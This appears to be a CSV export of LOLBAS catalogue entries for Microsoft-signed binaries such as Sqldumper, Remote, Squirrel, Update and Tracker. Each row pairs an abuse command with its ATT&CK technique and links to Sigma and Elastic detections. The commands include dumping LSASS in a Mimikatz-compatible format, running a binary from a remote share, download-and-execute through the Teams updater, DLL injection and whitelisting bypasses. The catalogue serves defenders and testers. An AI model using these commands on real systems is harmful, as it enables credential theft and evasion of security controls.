Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"rcsi.exe","Non-Interactive command line inerface included with Visual Studio.","Oddvar Moe","2018-05-25","rcsi.exe bypass.csx","Use embedded C# within the csx script to execute the code.","Local execution of arbitrary C# code stored in local CSX file.","Execute","User","T1127","Windows","no default","Sigma: https://github.com/SigmaHQ/sigma/blob/7bca85e40618126643b9712b80bd663c21908e26/rules/windows/process_creation/win_susp_csi.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml, BlockRule: https://github.com/SigmaHQ/sigma/blob/7bca85e40618126643b9712b80bd663c21908e26/rules/windows/process_creation/win_susp_csi.yml","https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/","Matt Nelson (@enigma0x3)","http://localhost:4001/lolbas/OtherMSBinaries/Rcsi/"
"rcsi.exe","Non-Interactive command line inerface included with Visual Studio.","Oddvar Moe","2018-05-25","rcsi.exe bypass.csx","Use embedded C# within the csx script to execute the code.","Local execution of arbitrary C# code stored in local CSX file.","AWL Bypass","User","T1127","Windows","no default","Sigma: https://github.com/SigmaHQ/sigma/blob/7bca85e40618126643b9712b80bd663c21908e26/rules/windows/process_creation/win_susp_csi.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml, BlockRule: https://github.com/SigmaHQ/sigma/blob/7bca85e40618126643b9712b80bd663c21908e26/rules/windows/process_creation/win_susp_csi.yml","https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/","Matt Nelson (@enigma0x3)","http://localhost:4001/lolbas/OtherMSBinaries/Rcsi/"
"Remote.exe","Debugging tool included with Windows Debugging Tools","mr.d0x","2021-06-01","Remote.exe /s ""powershell.exe"" anythinghere","Spawns powershell as a child process of remote.exe","Executes a process under a trusted Microsoft signed binary","AWL Bypass","User","T1127","Windows","C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe, C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe","IOC: remote.exe process spawns, Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml","https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/","mr.d0x (@mrd0x)","http://localhost:4001/lolbas/OtherMSBinaries/Remote/"
"Remote.exe","Debugging tool included with Windows Debugging Tools","mr.d0x","2021-06-01","Remote.exe /s ""powershell.exe"" anythinghere","Spawns powershell as a child process of remote.exe","Executes a process under a trusted Microsoft signed binary","Execute","User","T1127","Windows","C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe, C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe","IOC: remote.exe process spawns, Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml","https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/","mr.d0x (@mrd0x)","http://localhost:4001/lolbas/OtherMSBinaries/Remote/"
"Remote.exe","Debugging tool included with Windows Debugging Tools","mr.d0x","2021-06-01","Remote.exe /s ""\\10.10.10.30\binaries\file.exe"" anythinghere","Run a remote file","Executing a remote binary without saving file to disk","Execute","User","T1127","Windows","C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe, C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe","IOC: remote.exe process spawns, Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml","https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/","mr.d0x (@mrd0x)","http://localhost:4001/lolbas/OtherMSBinaries/Remote/"
"Sqldumper.exe","Debugging utility included with Microsoft SQL.","Oddvar Moe","2018-05-25","sqldumper.exe 464 0 0x0110","Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).","Dump process using PID.","Dump","Administrator","T1003","Windows","C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe, C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_sqldumper_activity.yml, Elastic: https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_lsass_memdump_file_created.toml, Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml","https://twitter.com/countuponsec/status/910969424215232518, https://twitter.com/countuponsec/status/910977826853068800, https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se","Luis Rocha (@countuponsec)","http://localhost:4001/lolbas/OtherMSBinaries/Sqldumper/"
"Sqldumper.exe","Debugging utility included with Microsoft SQL.","Oddvar Moe","2018-05-25","sqldumper.exe 540 0 0x01100:40","0x01100:40 flag will create a Mimikatz compatible dump file.","Dump LSASS.exe to Mimikatz compatible dump using PID.","Dump","Administrator","T1003.001","Windows","C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe, C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_sqldumper_activity.yml, Elastic: https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_lsass_memdump_file_created.toml, Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml","https://twitter.com/countuponsec/status/910969424215232518, https://twitter.com/countuponsec/status/910977826853068800, https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se","Luis Rocha (@countuponsec)","http://localhost:4001/lolbas/OtherMSBinaries/Sqldumper/"
"Sqlps.exe","Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\100 and 110 are Powershell v2. Microsoft SQL Server\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.","Oddvar Moe","2018-05-25","Sqlps.exe -noprofile","Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.","Execute PowerShell commands without ScriptBlock logging.","Execute","User","T1218","Windows","C:\Program files (x86)\Microsoft SQL Server\100\Tools\Binn\sqlps.exe, C:\Program files (x86)\Microsoft SQL Server\110\Tools\Binn\sqlps.exe, C:\Program files (x86)\Microsoft SQL Server\120\Tools\Binn\sqlps.exe, C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe, C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\SQLPS.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_use_of_sqlps_bin.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/80d2aee9449050652ca02fe8892e7bc23de3b70c/rules/windows/image_load/sysmon_in_memory_powershell.yml, Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/execution_suspicious_powershell_imgload.toml, Splunk: https://github.com/splunk/security_content/blob/aa9f7e0d13a61626c69367290ed1b7b71d1281fd/docs/_posts/2021-10-05-suspicious_copy_on_system32.md","https://twitter.com/ManuelBerrueta/status/1527289261350760455, https://twitter.com/bryon_/status/975835709587075072, https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-2017","Bryon (@bryon_), Manny (@ManuelBerrueta)","http://localhost:4001/lolbas/OtherMSBinaries/Sqlps/"
"SQLToolsPS.exe","Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.","Oddvar Moe","2018-05-25","SQLToolsPS.exe -noprofile -command Start-Process calc.exe","Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.","Execute PowerShell command.","Execute","User","T1218","Windows","C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_use_of_sqltoolsps_bin.yml, Splunk: https://github.com/splunk/security_content/blob/aa9f7e0d13a61626c69367290ed1b7b71d1281fd/docs/_posts/2021-10-05-suspicious_copy_on_system32.md","https://twitter.com/pabraeken/status/993298228840992768, https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-2017","Pierre-Alexandre Braeken (@pabraeken)","http://localhost:4001/lolbas/OtherMSBinaries/Sqltoolsps/"
"Squirrel.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Reegun J (OCBC Bank) - @reegun21","2019-06-26","squirrel.exe --download [url to package]","The above binary will go to url and look for RELEASES file and download the nuget package.","Download binary","Download","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\current\Squirrel.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_susp_squirrel_lolbin.yml","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56","Reegun J (OCBC Bank) (@reegun21), Adam (@Hexacorn)","http://localhost:4001/lolbas/OtherMSBinaries/Squirrel/"
"Squirrel.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Reegun J (OCBC Bank) - @reegun21","2019-06-26","squirrel.exe --update [url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","AWL Bypass","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\current\Squirrel.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_susp_squirrel_lolbin.yml","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56","Reegun J (OCBC Bank) (@reegun21), Adam (@Hexacorn)","http://localhost:4001/lolbas/OtherMSBinaries/Squirrel/"
"Squirrel.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Reegun J (OCBC Bank) - @reegun21","2019-06-26","squirrel.exe --update [url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","Execute","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\current\Squirrel.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_susp_squirrel_lolbin.yml","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56","Reegun J (OCBC Bank) (@reegun21), Adam (@Hexacorn)","http://localhost:4001/lolbas/OtherMSBinaries/Squirrel/"
"Squirrel.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Reegun J (OCBC Bank) - @reegun21","2019-06-26","squirrel.exe --updateRoolback=[url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","AWL Bypass","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\current\Squirrel.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_susp_squirrel_lolbin.yml","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56","Reegun J (OCBC Bank) (@reegun21), Adam (@Hexacorn)","http://localhost:4001/lolbas/OtherMSBinaries/Squirrel/"
"Squirrel.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Reegun J (OCBC Bank) - @reegun21","2019-06-26","squirrel.exe --updateRollback=[url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","Execute","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\current\Squirrel.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_squirrel.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_susp_squirrel_lolbin.yml","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56","Reegun J (OCBC Bank) (@reegun21), Adam (@Hexacorn)","http://localhost:4001/lolbas/OtherMSBinaries/Squirrel/"
"te.exe","Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).","Oddvar Moe","2018-05-25","te.exe bypass.wsc","Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.","Execute Visual Basic script stored in local Windows Script Component file.","Execute","User","T1127","Windows","no default","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_use_of_te_bin.yml","https://twitter.com/gn3mes1s/status/927680266390384640?lang=bg","Giuseppe N3mes1s (@gN3mes1s)","http://localhost:4001/lolbas/OtherMSBinaries/Te/"
"Tracker.exe","Tool included with Microsoft .Net Framework.","Oddvar Moe","2018-05-25","Tracker.exe /d .\calc.dll /c C:\Windows\write.exe","Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.","Injection of locally stored DLL file into target process.","Execute","User","T1127","Windows","no default","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_tracker_execution.yml","https://twitter.com/subTee/status/793151392185589760, https://attack.mitre.org/wiki/Execution","Casey Smith (@subTee)","http://localhost:4001/lolbas/OtherMSBinaries/Tracker/"
"Tracker.exe","Tool included with Microsoft .Net Framework.","Oddvar Moe","2018-05-25","Tracker.exe /d .\calc.dll /c C:\Windows\write.exe","Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.","Injection of locally stored DLL file into target process.","AWL Bypass","User","T1127","Windows","no default","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_tracker_execution.yml","https://twitter.com/subTee/status/793151392185589760, https://attack.mitre.org/wiki/Execution","Casey Smith (@subTee)","http://localhost:4001/lolbas/OtherMSBinaries/Tracker/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --download [url to package]","The above binary will go to url and look for RELEASES file and download the nuget package.","Download binary","Download","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --update=[url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","AWL Bypass","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --update=[url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","Execute","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --update=\\remoteserver\payloadFolder","The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.","Download and execute binary","AWL Bypass","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --update=\\remoteserver\payloadFolder","The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.","Download and execute binary","Execute","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --updateRollback=[url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","AWL Bypass","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
"Update.exe","Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.","Oddvar Moe","2019-06-26","Update.exe --updateRollback=[url to package]","The above binary will go to url and look for RELEASES file, download and install the nuget package.","Download and execute binary","Execute","User","T1218","Windows 7 and up with Microsoft Teams installed","%localappdata%\Microsoft\Teams\update.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_squirrel_lolbin.yml, IOC: Update.exe spawned an unknown process","https://www.youtube.com/watch?v=rOP3hnkj7ls, https://twitter.com/reegun21/status/1144182772623269889, https://twitter.com/MrUn1k0d3r/status/1143928885211537408, https://twitter.com/reegun21/status/1291005287034281990, http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/, https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12, https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/","Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21), Mr.Un1k0d3r (@MrUn1k0d3r), Adam (@Hexacorn), Jesus Galvez","http://localhost:4001/lolbas/OtherMSBinaries/Update/"
